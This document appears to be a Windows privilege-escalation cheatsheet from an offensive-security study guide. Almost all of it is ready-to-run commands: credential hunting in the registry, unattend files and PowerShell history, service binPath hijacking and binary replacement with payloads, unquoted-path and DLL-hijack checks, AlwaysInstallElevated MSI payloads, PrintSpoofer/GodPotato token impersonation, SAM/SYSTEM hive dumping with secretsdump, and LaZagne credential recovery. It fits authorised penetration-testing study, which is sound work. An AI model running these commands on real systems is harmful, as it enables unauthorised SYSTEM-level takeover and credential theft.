    10.10 Windows Privilege Escalation Cheatsheet

    ← Cheatsheet index | Full procedure | Credential use | Strategy map | Study methods: Escalate privileges on Windows

    TOKEN → CONTROLLED INPUT → EFFECTIVE RIGHT → PRIVILEGED CONSUMER → RUN-AS → TRIGGER → VERIFIED EFFECT

    10.10.1 Early tool-assisted pass

    Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity.

    whoami /all
winPEASx64.exe log

    Tool-to-finding workflow.

    10.10.2 Token and host baseline

    hostname
whoami /all
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
query user
net user
net localgroup Administrators
driverquery /v

    Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
Get-HotFix | Sort InstalledOn -Descending
Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine
Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName
Get-CimInstance Win32_SystemDriver | Select Name,State,StartMode,PathName

    Record integrity level, enabled/deny-only groups and enabled/present privileges. Medium-integrity Administrators membership is not a high-integrity process. Prefer CIM; WMIC may be absent. Get-HotFix is not a complete update inventory.

    10.10.3 Effective ACLs

    icacls "C:\Path\To\OBJECT"
sc.exe sdshow SERVICE
accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE

    F full · M modify · RX read/execute · R read · W write · D delete · I inherited · OI object inherit · CI container inherit.

    File, directory, registry, service and task ACLs are distinct. Check the exact object/right and current enabled SID. MIC can still block write-up.

    10.10.4 Credentials and artifacts

    cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul

    Get-Content -LiteralPath (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } |
  Select-String 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false

    cmdkey proves a target-bound stored entry, not plaintext. DPAPI artifacts need the protecting user/machine context. Classify identity/type/scope before reuse.

    10.10.5 Services

    Verify the selected service identity, effective control and required trigger; reachability alone is insufficient.     
    Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName

    sc.exe qc SERVICE
sc.exe sdshow SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE

    Need control + higher SERVICE_START_NAME + trigger. SERVICE_CHANGE_CONFIG, start and stop are separate rights. Use sc.exe in PowerShell; bare sc may be Set-Content.

    10.10.5.1 Change service path and restore 
    sc.exe qc SERVICE
sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE"
sc.exe stop SERVICE
sc.exe start SERVICE
sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH"

    Space after binPath= is required. Error 1053 may still follow payload execution; verify effect and restore.

    10.10.5.2 Replace writable binary 
    copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
sc.exe stop SERVICE
sc.exe start SERVICE

    Check parent delete/create rights, file locks, architecture and recovery.

    10.10.6 Unquoted service paths

    Verify the selected service identity, effective control and required trigger; reachability alone is insufficient.     
    Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } |
  Select Name,StartName,State,StartMode,PathName

    icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Vendor App"
sc.exe qc SERVICE

    For C:\Program Files\Vendor App\svc.exe, prove an earlier missing prefix such as C:\Program.exe or C:\Program Files\Vendor.exe is creatable, service runs higher and trigger exists.

    10.10.7 DLL/helper search

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.     
    icacls "C:\Path\To\Application"
sc.exe qc SERVICE
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"

    Need observed exact DLL request/load, selected writable searched directory, bitness/exports, privileged process and trigger. Account for redirection, API sets, SxS, loaded modules, KnownDLLs and application search flags. Procmon CreateFile + .dll + NAME NOT FOUND is useful when available.

    10.10.8 Scheduled tasks and startup consumers

    Check the privileged consumer, controlled input and actual schedule or trigger.     
    schtasks /query /fo LIST /v
schtasks /query /tn "\FOLDER\TASK" /xml
icacls "C:\Path\To\task-script.ps1"
icacls "C:\Path\To"
schtasks /run /tn "\FOLDER\TASK"

    Get-ScheduledTask | ForEach-Object {
  $t=$_
  [pscustomobject]@{Task="$($t.TaskPath)$($t.TaskName)";User=$t.Principal.UserId;RunLevel=$t.Principal.RunLevel;Actions=($t.Actions|Out-String).Trim()}
}

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

    Need writable consumed action/file plus higher principal and reliable trigger. Highest is relative to the task principal. /run accepted is not execution proof.

    10.10.9 AlwaysInstallElevated and UAC

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.     
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi

    Run only if both values are 0x1.

    whoami /groups
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

    UAC bypass normally raises an already-admin filtered token; it is not ordinary standard-user escalation.

    10.10.10 Token privileges

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.     
    whoami /priv
    PrivilegeDo not proceed until
    SeImpersonatePrivilegePrivileged auth trigger, build/arch/runtime and tool match
    SeAssignPrimaryTokenPrivilegeUseful token and process-creation requirements match
    SeBackupPrivilegePrivilege enabled and backup-aware read has useful target
    SeRestorePrivilegeRestore-aware write feeds a privileged consumer
    SeDebugPrivilegeTarget process is useful and not protected from access
    SeLoadDriverPrivilegeDriver is compatible/loadable/exploitable; crash risk accepted
    SeTakeOwnershipPrivilegeOwnership can become DACL/content control over a consumed object
    10.10.10.1 Impersonation variants 
    PrintSpoofer64.exe -i -c "cmd.exe"
GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt"

    Pick by actual prerequisite, not “Potato” name. Verify a SYSTEM process/effect with whoami /all.

    10.10.10.2 Backup privilege to local hashes 
    reg save HKLM\SAM C:\Windows\Temp\SAM.hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive

    impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

    Matched hives produce local credential material, not automatic SYSTEM or remote authorization.

    10.10.11 Software, drivers and kernel

    Use a matching affected build/configuration only after stronger permission-backed candidates have been assessed.     
    Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
                 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
  Select DisplayName,DisplayVersion,Publisher,InstallLocation

    systeminfo
driverquery /v

    Order: deterministic config/credential → exact privileged app → exact driver → kernel last. Validate build, cumulative update, architecture, component/config, exploit source and stability. Avoid Win32_Product.

    10.10.12 Automated candidate generation

    winPEASx64.exe log
Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt"
Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json"

    powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML"
Import-Module .\PowerUp.ps1
Invoke-AllChecks

    Validate every highlight manually. PrivescCheck may skip checks when elevated; Seatbelt has no official prebuilt binaries; PowerUp upstream is archived. Tool block/failure routes to native checks.

    No service restart rightBoot/dependency trigger or another path
    Unquoted but no writable prefixDisprove

    10.10.15 Recover supported application stores with LaZagne

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.

    Use a reviewed build in the relevant user's context; system-protected stores can require elevation.

    REM Start with the relevant application family
laZagne.exe browsers
REM Broader collection with a text report
laZagne.exe all -oN

    10.10.16 Discover and recognize candidates

    Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

    10.10.16.1 Escalate privileges on Windows

    10.10.16.1.1 Find: Establish Windows token, host and process context

    At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator.

    whoami /all
systeminfo
tasklist /svc

    Recognize: An Administrators SID exists but this effective process is filtered/medium-integrity.

    Validate next: Check actual enabled privileges and object operations in the process that will perform the action.

    Establish Windows token, host and process context.

    10.10.16.1.2 Find: Prove effective file, registry and service-object permissions

    Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions.

    icacls "C:\Path\To\OBJECT"
icacls "C:\Path\To"
sc.exe sdshow SERVICE

    Recognize: A modifiable parent can differ from a read-only file; service configuration rights are another control plane.

    Validate next: Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger.

    Prove effective file, registry and service-object permissions.

    10.10.16.1.3 Find: Recover Windows application, history and stored-credential artifacts

    Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context.

    cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

    Recognize: A target-bound saved credential is a possible consumer capability, not a plaintext password.

    Validate next: Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route.

    Recover Windows application, history and stored-credential artifacts.

    10.10.16.1.4 Find: Change a privileged service's executable configuration

    Inventory service accounts/paths, select a higher-identity service and query its effective service-object rights with the current token.

    Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
sc.exe qc SERVICE
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE

    Recognize: Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them.

    Validate next: Use sc qc to read the service account and command, sc sdshow/AccessChk to verify configuration rights and sc query to inspect state. Confirm an allowed start/restart trigger before changing the service, then verify whoami.

    Change a privileged service's executable configuration.

    10.10.16.1.5 Find: Replace a privileged service binary or consumed file

    From service inventory follow the exact executable/script path and inspect both its own ACL and its parent's replacement rights.

    sc.exe qc SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"

    Recognize: A higher-identity service consumes a potentially replaceable file in a modifiable directory.

    Validate next: Use sc qc to locate the real binary and account, then icacls on that file and its parent. Confirm replacement rights and an available privileged service start/restart; a writable unrelated file is insufficient.

    Replace a privileged service binary or consumed file.

    10.10.16.1.6 Find: Exploit an unquoted service path with a writable earlier prefix

    List service command lines and accounts, then inspect every earlier executable prefix in the actual unquoted path.

    Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName

    Recognize: Spaces plus absent executable quoting create candidate earlier prefixes; writable placement and trigger remain unproved.

    Validate next: Read the unquoted service command with sc qc. Check each earlier executable prefix for write/create access with icacls; confirm the service account and restart trigger. Spaces alone do not make the path exploitable.

    Exploit an unquoted service path with a writable earlier prefix.

    10.10.16.1.7 Find: Control a privileged DLL, helper or configuration load

    Investigate a privileged application with observed dependency failures; if permitted, filter its runtime file loads in Procmon before checking candidate directory ACLs.

    Procmon, when accessible: filter the actual process; inspect requested .dll paths and NAME NOT FOUND results.
Record the exact requested filename and every searched location.
Then inspect the selected location's effective ACL with the owning procedure.

    Recognize: An actual requested missing dependency is stronger than guessing a DLL name, but does not prove an attacker-controlled resolution wins.

    Validate next: Validate real privilege, search precedence/KnownDLLs/manifests, directory control, ABI/exports and a load trigger.

    Control a privileged DLL, helper or configuration load.

    10.10.16.1.8 Find: Control scheduled tasks, startup files or autostart consumers

    Enumerate task definitions and inspect the action, principal, arguments and working directory before permission-checking its files.

    schtasks /query /fo LIST /v
schtasks /query /tn "\FOLDER\TASK" /xml

    Recognize: A named privileged task exposes a concrete consumer and action path to investigate.

    Validate next: Read the task's exact action, principal and trigger with schtasks or Get-ScheduledTask. Check icacls on its file/parents and prove the stronger identity will consume the controlled path at a reachable trigger.

    Control scheduled tasks, startup files or autostart consumers.

    10.10.16.1.9 Find: Validate elevated installer policy and administrative-token context

    Inspect both machine/user installer-policy values and the current token before inferring an elevated MSI or UAC-context route.

    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
whoami /all

    Recognize: One policy value is insufficient; the two-policy conjunction is the key recognition condition.

    Validate next: For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately.

    Validate elevated installer policy and administrative-token context.

    10.10.16.1.10 Find: Select a privilege-backed impersonation or object-control route

    Inspect the current token's privileges, then map a relevant privilege to an actual protected operation and available source/trigger.

    whoami /priv
whoami /all

    Recognize: An impersonation capability is present; the privileged authentication source required by a specific tool is not established.

    Validate next: Read whoami /priv and whoami /all. Match the exact privilege, enabled state and token context to the technique's required API/trigger, then verify the resulting identity; the privilege name alone is not SYSTEM.

    Select a privilege-backed impersonation or object-control route.

    10.10.16.1.11 Find: Use backup privilege to obtain protected local credential material

    Inspect the actual token for backup-related rights and distinguish a privilege-aware read API from an ordinary file copy.

    whoami /priv

    Recognize: The privilege is assigned but initially disabled; permitted software may enable it for backup-semantic reads.

    Validate next: Check that the privilege can actually be used, supporting API/context, complete matched source set and writable output.

    Use backup privilege to obtain protected local credential material.

    10.10.16.1.12 Find: Select a matching application, driver or kernel exploit

    Collect OS build/patch and relevant installed driver/application versions before comparing any local-exploit requirement.

    Get-ComputerInfo | Select-Object OsBuildNumber,OsArchitecture
Get-HotFix
Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName

    Recognize: The exact component/build is the candidate evidence; an OS-family name or one missing KB is insufficient.

    Validate next: Verify vendor patch state, required driver/service/feature, architecture and PoC assumptions.

    Select a matching application, driver or kernel exploit.

    10.10.16.1.13 Find: Turn automated Windows findings into manually verified candidates

    Select a reviewed tool after checking host/runtime; treat each highlighted service, token or path as a lead to native evidence.

    whoami /all
$PSVersionTable
$ExecutionContext.SessionState.LanguageMode

    Recognize: The enumerator located a configuration clue, not the full usable chain.

    Validate next: Run winPEAS with log output, then inspect the exact reported service with sc qc/sc sdshow and its file with icacls. Check token highlights with whoami /priv. A collector's colored line is not the resulting elevated token.

    Turn automated Windows findings into manually verified candidates.
